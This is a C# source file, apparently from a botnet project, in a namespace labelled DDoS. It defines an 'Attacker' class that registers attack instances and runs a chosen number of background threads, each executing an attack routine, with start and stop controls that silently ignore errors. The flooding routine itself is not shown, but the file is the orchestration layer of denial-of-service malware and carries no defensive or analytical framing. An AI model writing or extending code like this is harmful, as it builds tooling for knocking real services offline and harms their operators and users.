using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;

namespace Vinchuca.Actions.DDoS
{
    class Attacker
    {
        public static readonly Dictionary<ulong, Attacker> Attackers = new Dictionary<ulong, Attacker>();
        public static readonly Log Logger = new Log(new TraceSource("DDoS-Attacker", SourceLevels.Verbose));

        private readonly BackgroundWorker[] _threads;

        public Attacker(int threadCount, Attack attack)
        {
            _threads = new BackgroundWorker[threadCount];

            for (var i = 0; i < threadCount; i++)
            {
                _threads[i] = new BackgroundWorker();
                _threads[i].DoWork += attack.Run;
                _threads[i].WorkerSupportsCancellation = true;
            }
        }

        public void Start()
        {
            foreach (var worker in _threads)
            {
                worker.RunWorkerAsync();
            }
        }

        public void Stop()
        {
            foreach (var worker in _threads)
            {
                try
                {
                    worker.CancelAsync();
                    worker.Dispose();
                }
                catch { }
            }
        }
    }
}